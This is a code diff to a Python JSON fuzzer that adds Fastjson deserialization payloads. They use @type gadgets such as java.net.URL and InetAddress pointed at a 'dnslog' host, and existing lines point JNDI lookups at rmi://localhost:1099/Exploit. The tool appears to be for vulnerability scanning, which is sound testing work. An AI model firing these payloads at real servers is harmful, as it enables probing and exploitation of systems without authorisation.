@@ -30,6 +30,16 @@ class JSON(Fuzzer):
         """{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"}""",
         # JtaTransactionConfig
         """{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}""",
+        # https://paper.seebug.org/1192/
+        """{"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}""",
+        """{"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}""",
+        """{"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}""",
+        """{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}""",
+        """{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}""",
+        """{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}""",
+        """{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}""",
+        """{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}""",
+        """{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0""",
     ]
 
     def __init__(self):
